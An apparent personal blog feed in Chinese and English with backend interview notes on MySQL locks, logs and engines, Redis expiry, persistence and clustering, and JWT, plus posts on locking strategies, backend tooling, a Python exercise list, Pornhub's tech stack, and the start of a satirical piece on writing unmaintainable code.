<p>MyISAM:只支持表级锁<br>表读锁/共享锁:获取后, 其他请求可以读不能写,对MyISAM的读操作，不会阻塞其他用户对同一表读请求，但会阻塞对同一表的写请求；<br>表写锁/排它锁:获取后, 其他请求既不能读也不能写,对MyISAM的写操作，则会阻塞其他用户对同一表的读和写操作；<br>加锁方式:1.数据库自动管理,查询前给设计的表添加读锁, 更新前(增删改)给涉及的表加写锁<br>2.MyISAM在执行查询语句前，会自动给涉及的所有表加共享锁，一旦上共享锁,其他进程就不能获取排它锁, 就不能进行写操作, 在执行更新、删除、增加操作前，会自动给涉及的表加写锁，这个过程并不需要用户干预<br>3.MyISAM表的读操作和写操作之间，以及写操作之间是串行的。<br>4.当一个线程获得对一个表的写锁后，只有持有锁线程可以对表进行更新操作。其他线程的读、写操作都会等待，直到锁被释放为止。<br>InnoDB:支持行级锁和表级锁, 优先使用行级锁<br>行共享锁:获取后, 其他事务也可以获取目标集的共享锁, 但不能获取目标集的排他锁<br>行排它锁:获取后, 其他事务既不能获取目标集的共享锁, 也不能获取对应的排它锁<br>加锁方式:1.对于查询语句，innodb不会加任何锁，也就是可以多个并发去进行查询的操作，不会有任何的锁冲突，因为根本没有锁。<br>2.对于增加、删除、更新操作，innodb会自动给涉及到的数据加排他锁，只有查询操作需要我们手动设置排他锁。<br>3.执行增删改前自动加排它锁<br>4.查询语句不需要任何锁, innoDB也不添加任何锁<br>5.增删改必须获取排它锁, 普通查询不需要获取任何锁</p>
<p>二十五、REDO和UNDO</p>
<p>UNDO:作用:1.用于回滚,现实事务的原子性<br>2.实现多版本并发控制(MVCC)<br>原理:在数据操作只从之前,先将牵扯到的数据备份到UNDO LOG, 然后再进行数据的操作<br>如果出现回滚操作,系统可以利用Undo Log中的备份将数据恢复到事务开始之前的状态<br>Undo log必须先于数据持久化到磁盘,如果在D,E之间系统崩溃, undo log是完整的,可以用来回滚事务<br>​<br>REDO:记录的是新数据的备份<br>作用:保证事务持久性<br>原理:1 新数据写入内存缓冲区后,将执行的更新操作写入redo log,再将数据写入磁盘(一定发生在redo写入之后,但未必立即执行)<br>2.当系统崩溃时,虽然数据没有写入磁盘,但是Redo Log已经持久化,系统可以根据Redo log的内容,将所有数据恢复到最新的状态<br>3.虽然redo log和写入数据库 都是写入磁盘,但是redo log的性能高于写入数据库(redo log只写入命令,不添加事务的判断)<br>​<br>数据库恢复:1.mysql重启后自动进行 2.先REDO,再UNDO 3.进行恢复时,<br>3.1 REDO不区分事务,会重复做所有操作(包括未提交的操作和最终回滚的操作)<br>3.2 然后再由UNDO来回滚未提交和要执行回滚的事务</p>
<p>二十六、数据库引擎</p>
<p>实现数据存储的不同解决方案<br>InnoDB mysql5.5开始 默认<br>支持事务,支持行级锁和表级锁,并发访问时效率高,支持外键约束,插入/更新/主键查询快,需要内存和硬盘多,常规推荐使用<br>MyISAM:不支持事务,不支持外键约束,只支持表级锁,批量插入/查询/count速度快<br>简单, 适合小型项目和以批量插入和查询为主的系统(内部管理系统)</p>
<p>二十七、什么是RPC,gRPC?</p>
<p>RPC (远程过程调同) 是一个计算机通信协议<br>作用: 可以以函数形式来调用另一台计算机上的程序<br>优点: 使用自定义的二进制形式进行数据传输, 效率极高<br>应用场景:子系统之间进行数据交互</p>
<p>grpc:谷歌开发的高性能的RPC框架<br>优点:1.使用http2.0标准, 支持双向流和多路复用 2.支持多语言和多平台</p>
<p>http2.0利用二进制的分帧层对请求头,请求体进行分组分包, 这样就允许在同一个连接可以发送和接收多个请求的数据<br>主要特点:二进制分帧层,多路复用,头部压缩,服务器推送</p>
<p>二十八、APSchedule定时器</p>
<p>分为crontab和apschedule<br>crontab:是linux系统一个内置命令,依赖于linux系统,无动态管理任务,适合于普通的静态任务.<br>apschedule:独里的定时器程序,可以方便的管理定时任务,需要动态生成.<br>支持三种触发器<br>date 只执行一次<br>interval 周期执行 参数时间间隔<br>cron 周期执行 参数时间</p>
<p>二十九、缓存更新问题</p>
<p>mysql和redis是两个独立的系统,在并发环境下,无法保证更新的一致性,解决办法:更新数据时,先写入mysql,再删除缓存,设计分布式锁或使消息队列串行处理</p>
<p>三十、缓存有效期和淘汰策略</p>
<p>设置有效期的作用:1.节省空间 2.做到数据弱一致性，有效期失效后，可以保证数据的一致性<br>过期策略:1.定时过期:效率太低,每个数据都需要设置定时器进行计数<br>2.惰性过期:查询时,才去检查数据的有效期,如果过期,则返回nil,并删除过期数据<br>3.定期过期:每隔100ms,随机取出一部分数据进行过期校验,如果过期, 删除数据<br>redis中选择惰性过期+定期过期 (每100ms对设置了过期时间的数据随机查询并删除过期数据)<br>LRU:least recently use 优先淘汰不是最近使用的数据<br>LFU:least frequently use 优先淘汰不是频繁使用的数据<br>采用了定期衰减的机制, 防止旧数据始终无法删除<br>缺点:需要每条数据维护一个使用计数,还需要定期衰减</p>
<p>三十一、为什么不用定时过期策略?</p>
<p>定时过期,用一个定时器来负责监视key,过期则自动删除。虽然内存及时释放，但是十分消耗CPU资源。在大并发请求下，CPU要将时间应用在处理请求，而不是删除key,因此没有采用这一策略.</p>
<p>三十二、定期过期+惰性过期是如何工作的呢?</p>
<p>定期过期，redis默认每个100ms检查，是否有过期的key,有过期key则删除。需要说明的是，redis不是每个100ms将所有的key检查一次，<br>而是随机抽取进行检查(如果每隔100ms,全部key进行检查，redis岂不是卡死)。因此，如果只采用定期过去策略，会导致很多key到时间没有删除。<br>于是，惰性过期派上用场。也就是说在你获取某个key的时候，redis会检查一下，这个key如果设置了过期时间那么是否过期了？如果过期了此时就会删除。</p>
<p>三十三、采用定期过期+惰性过期就没其他问题了么?</p>
<p>不是的，如果定期过期没删除key。然后你也没即时去请求key，也就是说惰性过期也没生效。这样，redis的内存会越来越高。那么就应该采用内存淘汰机制。</p>
<p>三十四、JWE</p>
<p>对称加密:<br>代表算法 des 3des aes,速度快<br>非对称加密:<br>代表算范 rsa<br>速度慢,不适合大型数据加密<br>加密时,一般公钥加密,私钥解密,与签名相反<br>私钥唯一,使用私钥签名,公钥验签,可以保证签名者身份唯一<br>主要用于数据加密<br>最佳方案 (JWE)<br>传输的数据使用对称加密, 生成数据密文, 对称加密秘钥是随机的,为了防止数据篡改,对数据密文进行摘要认证,摘要认证的秘钥也是随机的,对称加密的秘钥和摘要认证的秘钥使用非对称加密进行处理<br>JWE的耗时远高于JWS</p>
<p>三十五、为什么使用JWT进行状态保持?</p>
<p>因为APP不支持状态保持,状态保持有同源策略,无法跨服务器传递,所以不采用session.session依赖于cookie不安全,session存在于数据库,用户多时,影响数据库性能</p>
<p>三十六、什么是JWT?</p>
<p>JWT不可逆加密部分主要用于数据认证, 防止数据被修改</p>
<p>三十七、CDN加速是对网站所在服务器加速，还是对其域名加速？</p>
<p>CDN是只对网站的某一个具体的域名加速。如果同一个网站有多个域名，则访客访问加入CDN的域名获得加速效果，访问未加入CDN的域名，或者直接访问IP地址，则无法获得CDN效果。<br>三十八、CDN使用后，原来的网站是否需要做修改，做什么修改？</p>
<p>一般而言，网站无需任何修改即可使用CDN获得加速效果。只是对需要判断访客IP程序，才需要做少量修改。</p>
<p>三十九、如何解决刷新问题？</p>
<p>1.手机号+验证码（或帐号+密码）验证后颁发接口调用token与refresh_token（刷新token）<br>2.Token 有效期为2小时，在调用接口时携带，每2小时刷新一次<br>3.提供refresh_token，refresh_token 有效期14天<br>4.在接口调用token过期后凭借refresh_token 获取新token<br>5.未携带token 、错误的token或接口调用token过期，返回401状态码<br>6.refresh_token 过期返回403状态码，前端在使用refresh_token请求新token时遇到403状态码则进入用户登录界面从新认证。</p>
<p>四十、判断问题发生在前端还是后端?</p>
<p>如果前端为网页，可以通过网页调试工具里面的network判断<br>如果前端不是网页，比如app，通过日志的访问请求记录判断<br>如果是后端出现的问题，通过pycharm或日志来判断</p>
<p>四十一、数据库优化</p>
<p>1.在进行表设计时，可适度增加冗余字段(反范式设计)，减少JOIN操作；<br>2.多字段表可以进行垂直分表优化，多数据表可以进行水平分表优化；<br>3.选择恰当的数据类型，如整型的选择；<br>4.对于强调快速读取的操作，可以考虑使用MyISAM数据库引擎；<br>5.对较频繁的作为查询条件的字段创建索引；唯一性太差的字段不适合单独创建索引，即使频繁作为查询条件；更新非常频繁的字段不适合创建索引；<br>6.编写SQL时使用上面的方式对SQL语句进行优化；<br>7.使用慢查询工具找出效率低下的SQL语句进行优化；<br>8.构建缓存，减少数据库磁盘操作；<br>9.可以考虑结合使用内在型数据库，如Redis，进行混合存储。</p>
<p>四十二、Redis事务</p>
<p>语法:<br>1.MULTI:开启事务, 后续的命令会被加入到同一个事务中<br>事务中的操作会发给服务端, 但是不会立即执行, 而是放到了该事务的对应的一个队列中, 服务端返回QUEUED<br>2.EXEC:执行EXEC后, 事务中的命令才会被执行,事务中的命令出现错误时, 不会回滚也不会停止事务, 而是继续执行<br>3.DISCARD:取消事务, 事务队列会清空, 客户端退出事务状态<br>ACID:<br>1.原子性: 不支持, 不会回滚并且有错误也会继续执行<br>2.隔离性: 支持, 单进程,单线程, 事务中的命令顺序执行, 并且不会被其他客户端(事务)打断(先EXEC的先执行)在事务中的会一次性执行完再执行下一个命令(事务)<br>3.持久性:不支持, redis数据丢失<br>4.一致性: 不支持, 如果强制使用一致性,需要加乐观锁(watch监听)<br>watch:redis实现的乐观锁 可以实现秒杀超卖需求<br>事务开启前, 设置对数据的监听, EXEC时, 如果发现数据发生过修改, 事务会自动取消<br>事务EXEC后, 无论成败, 监听会被移除<br>setnx和悲观锁:setnx键不存在,才会设置成功</p>
<p>四十三、Redis持久化</p>
<p>分为RDB快照存储和AOF只追加文件<br>RDB:将内存中的所有数据 完整的保存到硬盘中,配置中设置自动持久化策略<br>优点:方便数据备份:由于保存到单独的文件中,易于数据备份<br>写时复制:子进程单独完成持久化操作,父进程不参与IO操作, 最大化redis性能<br>恢复大量数据时,速度优于AOF<br>缺点:不是实时保存数据,如果redis意外停止工作,则可能会丢失一段时间的数据<br>数据量大时,fork进程会比较慢,持久化时使redis响应速度变慢<br>AOF:只追加而不是全部重新写入,追加命令而不是数据<br>优点:更可靠 默认每秒同步一次操作,最多丢失一秒数据<br>可以进行文件重写,以避免AOF文件过大<br>缺点:相同数据集,AOF文件比RDB体积大,恢复速度慢<br>除非是不同步情况,否则普遍要比RDB速度慢</p>
<p>四十四、如何选择RDB和AOF?</p>
<p>对于更新频繁,一致性要求不是非常高的数据可以选择使用redis进行持久化存储<br>RDB or AOF:<br>数据安全性要求高, 都打开<br>可以接受短时间的数据丢失, 只使用RDB<br>即使使用AOF,最好也开启RDB,因为便于备份并且回复速度快,bug更少<br>使用redis进行一部分数据的持久化存储<br>两种持久化机制都开启</p>
<p>四十五、什么是哨兵机制?</p>
<p>监控redis服务器的运行状态,可以进行自动故障转移,实现高可用,与数据库主从配合使用的机制<br>特点:<br>1.独自的进程, 每台redis服务器应该至少配置一个哨兵程序<br>2.监控redis主服务器的运行状态<br>3.出现故障后可以向管理员/其他程序发出通知<br>4.针对故障,可以进行自动转移, 并向客户端提供新的访问地址<br>至少在3台服务器上分别启动至少一个哨兵<br>如果只有一台,则服务器宕机后,将无法进行故障迁移<br>如果只有两台,一旦一个哨兵挂掉了,则投票会失败<br>心跳机制和投票裁决</p>
<p>四十六、什么是集群?</p>
<p>多个节点共同保存数据,它能扩展存储空间,提高吞吐量,提高写的性能,不在区分数据库,只有0号库,单机默认0-15,不支持事务,管道和多值操作.<br>要求至少三主三从,要求必须开启AOF持久化,自动选择集群节点进行存储,默认集成哨兵,自动故障转移<br>redis集群不能支持事务和WATCH, 并发控制只能自己设计悲观锁,集群负责实现缓存设计</p>
<p>四十六、数据库设计?</p>
<p>索引的原理采用了B+Tree平衡二叉树结构,有聚簇索引和非聚簇索引,<br>聚簇索引:主键B+树在叶子节点直接存储的是数据行, InnoDB引擎使用.优点: 主键查询的速度非常快,缺点: 增删改比较慢,其它的主键查询要二次查询<br>非聚簇索引:主键B+树在叶子节点只是存储真正数据行的地址, 数据行和索引存储在不同的结构中,MyISAM引擎使用优点: 增删改比较快, 非主键的查询也比较快<br>缺点: 不支持事务<br>所以我们大多数的表都使用了聚簇索引和InnoDB引擎,因为InnoDB引擎支持事务,可以进行事务回滚,恢复速度快,还支持行级锁和表级锁,<br>提高并发访问时的效率,支持外键约束,插入更新主键查询快,但是需要的内存和硬盘多,<br>而MyISAM引擎不支持事务和外键约束,只支持表级锁,批量插入和查询速度快,适合小型项目,我们项目中系统公告表因为基本不会修改,<br>不存在大量并发写操作,也就不需要行级锁和事务为数据安全稳定做保障,查询多,MyISAM的查询速度会更快.<br>当初我们尝试使用业务字段作为主键,结果是可以使用,但是不太好,业务字段更新频繁,一旦修改,索引也要跟着变,成本比较高,</p>
]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>悲观锁和乐观锁问题</title>
    <url>/2020/02/15/lock/</url>
    <content><![CDATA[<p>悲观锁和乐观锁问题<br><a id="more"></a></p>
<p>悲观锁：假定会发生并发冲突，屏蔽一切可能违反数据完整性的操作。</p>
<p>乐观锁：假设不会发生并发冲突，只在提交操作时检查是否违反数据完整性。</p>
<h1 id="乐观锁使用"><a href="#乐观锁使用" class="headerlink" title="乐观锁使用"></a>乐观锁使用</h1><p>对数据加上字段，不如时间和版本号等，最终提交数据时，对数据现在的时间或版本号字段和最初对比，一旦不同，则弃用数据<br>电商网站库存，当多用户并发修改同一条记录时，可定是后提交的用户将覆盖前者提交的结果，这个时候，可以使用加乐观锁的机制去解决高并发的问题</p>
<p>Reids 的并发竞争问题解决方案，使用乐观锁方式进行解决，成本低，非阻塞，性能较高、<br><img src="https://i.loli.net/2020/02/15/3L5nfOE4rl72MJq.png" alt="乐观锁和悲观锁"></p>
<p>事务隔离级别指的是在处理同一个数据的多个事务中，一个事务修改数据后，其他事务何时能看到修改后的结果。</p>
<p>MySQL数据库事务隔离级别主要有四种：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Serializable 串行化，一个事务一个事务的执行</span><br><span class="line"> </span><br><span class="line">Repeatable read 可重复读，无论其他事务是否修改并提交了数据，在这个事务中看到的数据值始终不受其他事务影响</span><br><span class="line"> </span><br><span class="line">Read committed 读取已提交，其他事务提交了对数据的修改后，本事务就能读取到修改后的数据值</span><br><span class="line"> </span><br><span class="line">Read uncommitted 读取为提交，其他事务只要修改了数据，即使未提交，本事务也能看到修改后的数据值。</span><br></pre></td></tr></table></figure></p>
<p>MySQL数据库默认使用可重复读（ Repeatable read），而使用乐观锁的时候，如果一个事务修改了库存并提交了事务，那其他的事务应该可以读取到修改后的数据值，所以不能使用可重复读的隔离级别，应该修改为读取已提交Read committed。</p>
<h1 id="悲观锁使用"><a href="#悲观锁使用" class="headerlink" title="悲观锁使用"></a>悲观锁使用</h1><p>需要使用数据库的锁机制，比如SQL SERVER 的TABLOCKX（排它表锁） 此选项被选中时，SQL  Server  将在整个表上置排它锁直至该命令或事务结束。这将防止其他进程读取或修改表中的数据。</p>
<p>悲观锁的业务流程<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">事务开始</span><br><span class="line">查询、修改数据表之前 加锁</span><br><span class="line">对数据库 操作</span><br><span class="line">事务提交（检测、返回冲突）</span><br></pre></td></tr></table></figure></p>
<h2 id="优点与不足"><a href="#优点与不足" class="headerlink" title="优点与不足"></a>优点与不足</h2><p>先取锁再访问 为数据处理的安全性提供了保证</p>
<p>效率方面，让数据库产生了额外的开销 ，增加了死锁的机会</p>
<p>对于只读事务处理，不会产生并发冲突，加悲观锁，指挥增加系统的负载，降低了并行性</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
  </entry>
  <entry>
    <title>How to write a backend? Summary of back-end development ideas</title>
    <url>/2020/02/15/backend-1-en/</url>
    <content><![CDATA[<p>Teach you how to write a good backend<br><a id="more"></a></p>
<blockquote>
<p>The concept of the back end is the underlying logic of the entire Internet world, which is often more important than the front end, and there are more things to consider.</p>
</blockquote>
<h1 id="Back-end-common-tools-and-services"><a href="#Back-end-common-tools-and-services" class="headerlink" title="Back-end common tools and services"></a>Back-end common tools and services</h1><h2 id="operating-system"><a href="#operating-system" class="headerlink" title="operating system"></a>operating system</h2><p>The network is inseparable from the operating system, and the smallest embedded device also has a Linux system. Here we commonly use the operating system backend centos and Ubuntu. Centos is a free and open source community operating system under Red Hat. Centos has powerful and advanced features and better performance.<br>CentOS 8 was released on September 24, 2019. This version is different from the previous package library. It is mainly divided into two, one is BaseOS and AppStream, and began to use dnf as a management package program. Ubuntu is based on the Debian distribution and the Linux version of the GNOME desktop environment. It has a large number of users. Using it as a server, solving problems is not a problem.</p>
<h2 id="WEB-SERVER"><a href="#WEB-SERVER" class="headerlink" title="WEB SERVER"></a>WEB SERVER</h2><p>Here we commonly use Nginx, which is a web server like Apache. nginx uses asynchronous non-blocking multi-threaded architecture, which saves space more than apache multi-process. Nginx uses an event-driven architecture, which enables it to support millions of TCP connections. Powerful performance has become the best choice for hundreds of millions of users. Domestic companies have also revised nginx, and Tengine developed by Alibaba has been applied to projects such as Taobao.com.</p>
<h2 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h2><p>Here we use MySQL data for common projects. MySQL is open source and free. As the strongest representative of relational databases, hundreds of millions of services are using the msyql database. In addition, the postgre database is also a good choice and its functions are more powerful. For in-memory databases, we choose redis to be the best choice for caching data. You can also use redis for distributed.</p>
<h2 id="development-tools"><a href="#development-tools" class="headerlink" title="development tools"></a>development tools</h2><p>Recommend vscode, Microsoft’s free tool, you can download various plug-ins, an editor can complete the writing of code such as python, Java and node at the same time. It does not take up much memory and is the best choice for students with small notebooks. However, if you use the jetbrain series software, you can buy it, but the price is not cheap. Pycharm charges $ 199 a year.</p>
]]></content>
      <categories>
        <category>backend</category>
      </categories>
      <tags>
        <tag>backend</tag>
      </tags>
  </entry>
  <entry>
    <title>如何写后端？后端开发思路总结</title>
    <url>/2020/02/15/backend-1/</url>
    <content><![CDATA[<p>教你怎么写好后端<br><a id="more"></a></p>
<blockquote>
<p>后端的概念是整个互联网世界底层的逻辑，往往比前端更加重要，考虑的东西也更多。</p>
</blockquote>
<h1 id="后端常用工具和服务"><a href="#后端常用工具和服务" class="headerlink" title="后端常用工具和服务"></a>后端常用工具和服务</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p>网络离不开操作系统，最小的嵌入式设备也拥有着Linux系统的。这里我们后端常用的操作系统有centos和Ubuntu。centos作为红帽旗下的免费开源的社区操作系统，centos拥有着强大和先进的功能，性能比较好，<br>CentOS 8在2019年9月24日发布，此版本与之前的包库不同，主要分为两个，一个为BaseOS和AppStream，并且开始使用dnf作为管理包的程序。Ubuntu基于Debian发行版和GNOME桌面环境的Linux版本，使用人数众多，利用它作为服务器来说，解决问题不是难题。</p>
<h2 id="WEB服务器"><a href="#WEB服务器" class="headerlink" title="WEB服务器"></a>WEB服务器</h2><p>这里我们常用的是Nginx，同Apache一样都是一种WEB服务器。nginx采用异步非阻塞的多线程构架，比apache多进程更加节省空间。Nginx使用基于事件驱动架构，使得其可以支持数以百万级别的TCP连接。强大的性能成为了上亿用户的最佳选择。国内公司也对nginx进行了改版，阿里巴巴研发的Tengine被应用于淘宝网等项目。</p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>这里我们对于普通项目采用MySQL数据，MySQL是开源免费的，作为关系型数据库的最强代表，数亿服务都在使用msyql数据库，另外postgre数据库也是不错的选择，其功能更加强大。内存型数据库我们选择redis对于缓存数据是最好的选择，也可以利用redis进行分布式。</p>
<h2 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h2><p>推荐vscode，微软的免费工具，可以下载各种插件，一个编辑器可以同时完成python、Java和node等代码的编写。占的内存还不大，对于笔记本小的同学是最好的选择。但是，你如果使用jetbrain系列的软件比较顺手的话，可以购买使用，但是价钱不便宜，pycharm一年收费是199美金。</p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>2020年python最新基础教程——python100个例题和答案</title>
    <url>/2020/02/15/python-2/</url>
    <content><![CDATA[<p>python最新100例习题教程<br><a id="more"></a></p>
<p>python习题001：数字组合<br>python习题002：“个税计算”<br>python习题003：完全平方数<br>python习题004：这天第几天<br>python习题005：三数排序<br>python习题006：斐波那契数列<br>python习题007：copy<br>python习题008：九九乘法表<br>python习题009：暂停一秒输出<br>python习题010：给人看的时间<br>python习题011：养兔子<br>python习题012：100到200的素数<br>python习题013：所有水仙花数<br>python习题014：分解质因数<br>python习题015：分数归档<br>python习题016：输出日期<br>python习题017：字符串构成<br>python习题018：复读机相加<br>python习题019：完数<br>python习题020：高空抛物<br>python习题021：猴子偷桃<br>python习题022：比赛对手<br>python习题023：画菱形<br>python习题024：斐波那契数列II<br>python习题025： 阶乘求和<br>python习题026：递归求阶乘<br>python习题027：递归输出<br>python习题028：递归求等差数列<br>python习题029：反向输出<br>python习题030：回文数<br>python习题031：字母识词<br>python习题032：反向输出II<br>python习题033：列表转字符串<br>python习题034：调用函数<br>python习题035：设置输出颜色<br>python习题036：算素数<br>python习题037：排序<br>python习题038：矩阵对角线之和<br>python习题039：有序列表插入元素<br>python习题040：逆序列表<br>python习题041：类的方法与变量<br>python习题042：变量作用域<br>python习题043：作用域、类的方法与变量<br>python习题044：矩阵相加<br>python习题045：求和<br>python习题046：打破循环<br>python习题047：函数交换变量<br>python习题048：数字比大小<br>python习题049：lambda<br>python习题050：随机数<br>python习题051：按位与<br>python习题052：按位或<br>python习题053：按位异或<br>python习题054：位取反、位移动<br>python习题055：按位取反<br>python习题056：画圈<br>python习题057：画线<br>python习题058：画矩形<br>python习题059：画图（丑）<br>python习题060：字符串长度<br>python习题061：杨辉三角<br>python习题062：查找字符串<br>python习题063：画椭圆<br>python习题064：画椭圆、矩形<br>python习题065：画组合图形<br>python习题066：三数排序<br>python习题067：交换位置<br>python习题068：旋转数列<br>python习题069：报数<br>python习题070：字符串长度II<br>python习题071：输入和输出<br>python习题072：创建链表<br>python习题073：反向输出链表<br>python习题074：列表排序、连接<br>python习题075：不知所云<br>python习题076：做函数<br>python习题077：遍历列表<br>python习题078：字典<br>python习题079：字符串排序<br>python习题080：猴子分桃<br>python习题081：求未知数<br>python习题082：八进制转十进制<br>python习题083：制作奇数<br>python习题084：连接字符串<br>python习题085：整除<br>python习题086：连接字符串II<br>python习题087：访问类成员<br>python习题088：打印星号<br>python习题089：解码<br>python习题090：列表详解<br>python习题091：time模块<br>python习题092：time模块II<br>python习题093：time模块III<br>python习题094：time模块IV<br>python习题095：转换时间格式<br>python习题096：计算复读次数<br>python习题097：磁盘写入<br>python习题098：磁盘写入II<br>python习题099：磁盘读写<br>python习题100：列表转字典</p>
<ul>
<li>下载地址 <a href="https://www.lanzous.com/i9dah5e" target="_blank" rel="noopener">https://www.lanzous.com/i9dah5e</a></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python教程</tag>
      </tags>
  </entry>
  <entry>
    <title>pornhub technology stack</title>
    <url>/2020/02/14/pornhub%E2%80%94en/</url>
    <content><![CDATA[<p>What programming languages ​​does pornhub use?<br><a id="more"></a></p>
<p>pornhub is now the world’s largest porn platform, with hundreds of millions of people browsing the website or the last video and live broadcast<br>Pornhub’s high concurrency is unimaginable. How exactly does pornhub’s technical team accomplish the high concurrency needs?</p>
<h1 id="pornhub-technology-stack"><a href="#pornhub-technology-stack" class="headerlink" title="pornhub technology stack"></a>pornhub technology stack</h1><h2 id="rear-end"><a href="#rear-end" class="headerlink" title="rear end"></a>rear end</h2><p>Mainly Nginx, PHP, MySQL, Memcached / Redis.<br>Minor Varnish, ElasticSearch, NodeJS, Go, Vertica.</p>
<h2 id="front-end"><a href="#front-end" class="headerlink" title="front end"></a>front end</h2><p>I used pure JavaScript and started using frameworks such as Vue.js.</p>
<p>This is very surprising, PHP is the main language of the backend. The people who are black php are really faced, and the people who blow Java every day have nothing to say.<br>There are more than 42 billion visits to the P site in 2019, which means an average of 115 million visits per day. In 2019, Pornhub transmitted 6597PB of data, about 18,073 TB per day, and 209 gigabytes per second. In addition to huge page visits, there is huge video traffic that exceeds the traffic of YouTube, the world’s largest video site. It can be seen how powerful the technical support of pornographic websites is.</p>
<ul>
<li>When I use pornhub for a long time, there is no case of sending freeze.</li>
</ul>
<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>It does n’t matter whether it ’s PHP or Java or other languages. Pornographic sites like pornhub have relatively fixed content. Cache databases such as redis can be used for long-term caching, combined with the powerful ElasticSearch search engine to quickly retrieve the database. , The search results are more popular and will not take up too much server resources.<br>pornhub’s main job is to ensure the smoothness of the video. It uses a large number of CDNs and is distributed around the world to accelerate the smoothness of the video.<br>At the same time, the main income of pornhub comes from paid members-pornhub Premium and advertising. During Black Friday, pornhub also had a discount activity-life members. Here, let’s analyze how pornhub’s ads bypass the blocking. Generally, we have ad blocking plugins similar to Adblock, which will greatly reduce the benefits of advertising. Pornhub uses websocket technology to bypass the detection of the corresponding script.</p>
<h1 id="Support-for-China"><a href="#Support-for-China" class="headerlink" title="Support for China"></a>Support for China</h1><p>Although pornhub does not support intra-continental viewing, it has strengthened the support for Chinese, and a new website cn.pornhub.com has been added to enable native Chinese speakers to watch comfortably.</p>
]]></content>
  </entry>
  <entry>
    <title>pornhub技术栈</title>
    <url>/2020/02/14/pornhub/</url>
    <content><![CDATA[<p>pornhub用了哪些编程语言<br><a id="more"></a></p>
<p>pornhub作为现在世界上最大的色情平台，每天有上亿人次的浏览网站或者上次视频和直播<br>pornhub的高并发是难以想象的，究竟pornhub的技术团队是如何去完成高并发的需要的。</p>
<h1 id="pornhub技术栈"><a href="#pornhub技术栈" class="headerlink" title="pornhub技术栈"></a>pornhub技术栈</h1><h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><p>主要Nginx、PHP、MySQL、Memcached / Redis 。<br>次要Varnish、ElasticSearch、NodeJS、Go 语言、Vertica。</p>
<h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><p>用了纯 JavaScript并开始使用框架，比如 Vue.js。</p>
<p>这十分令人惊讶，PHP是后端的主要语言。黑php的人着实被打脸，天天吹Java的人也没话说了。<br>2019 年 P 站的访问量超过 420 亿次，这意味着平均每天有 1.15 亿次访问量，在 2019 年，Pornhub 传输了 6597PB 的数据，每天约 18,073 TB，每秒 209 千兆字节。巨大的页面访问之外，是巨大的视频流量，超越了YouTube这个全球最大视频网站的流量。可见，色情网站的技术支持多么强大。</p>
<ul>
<li>在我使用pornhub很长时间，没有发送卡顿的情况。</li>
</ul>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>PHP也好，还是Java或者是其他语言，都不重要，像pornhub这样的色情网站，内容比较固定，利用redis等缓存数据库可以进行长时间缓存，结合强大的ElasticSearch搜索引擎快速检索数据库，一般来说，搜索结果比较大众化，不会占用太多的服务器资源。<br>pornhub最主要的工作就是保证视频的流畅，采用大量CDN，分布于全球各地，加速视频的流畅度。<br>同时，pornhub比较主要的收入来自于付费会员——pornhub Premium 和广告。黑五的时候pornhub还搞过打折活动——终身会员。这里，我们来分析下pornhub的广告如何绕过屏蔽，一般我们都有类似于Adblock这样的广告屏蔽插件，这会大大减少广告投放的收益，pornhub采用了websocket技术，绕过了对应script的检测。</p>
<h1 id="对中国的支持"><a href="#对中国的支持" class="headerlink" title="对中国的支持"></a>对中国的支持</h1><p>尽管pornhub不支持大陆内观看，但是加强了对应中文的支持，新加了cn.pornhub.com的网址，使中文母语者可以舒适的观看。</p>
]]></content>
  </entry>
  <entry>
    <title>如何编写无法维护的代码</title>
    <url>/2020/02/14/coding-3/</url>
    <content><![CDATA[<p>最搞笑的编程方式，如何编写无法维护的代码<br><a id="more"></a></p>
<p>简介<br>永远不要（把自己遇到的问题）归因于（他人的）恶意，这恰恰说明了（你自己的）无能。 – 拿破仑</p>
<p>为了造福大众，在Java编程领域创造就业机会，兄弟我在此传授大师们的秘籍。这些大师写的代码极其难以维护，后继者就是想对它做最简单的修改都需要花上数年时间。而且，如果你能对照秘籍潜心修炼，你甚至可以给自己弄个铁饭碗，因为除了你之外，没人能维护你写的代码。再而且，如果你能练就秘籍中的全部招式，那么连你自己都无法维护你的代码了！</p>
<p>你不想练功过度走火入魔吧。那就不要让你的代码一眼看去就完全无法维护，只要它实质上是那样就行了。否则，你的代码就有被重写或重构的风险！</p>
<p>总体原则<br>Quidquid latine dictum sit, altum sonatur.<br>(随便用拉丁文写点啥都会显得高大上。)</p>
<p>想挫败维护代码的程序员，你必须先明白他的思维方式。他接手了你的庞大程序，没有时间把它全部读一遍，更别说理解它了。他无非是想快速找到修改代码的位置、改代码、编译，然后就能交差，并希望他的修改不会出现意外的副作用。</p>
<p>他查看你的代码不过是管中窥豹，一次只能看到一小段而已。你要确保他永远看不到全貌。要尽量和让他难以找到他想找的代码。但更重要的是，要让他不能有把握忽略任何东西。</p>
<p>程序员都被编程惯例洗脑了，还为此自鸣得意。每一次你处心积虑地违背编程惯例，都会迫使他必须用放大镜去仔细阅读你的每一行代码。</p>
<p>你可能会觉得每个语言特性都可以用来让代码难以维护，其实不然。你必须精心地误用它们才行。</p>
<p>命名<br>“当我使用一个单词的时候” Humpty Dumpty 曾经用一种轻蔑的口气说, “它就是我想表达的意思，不多也不少。“</p>
<ul>
<li>Lewis Carroll – 《爱丽丝魔镜之旅》， 第6章</li>
</ul>
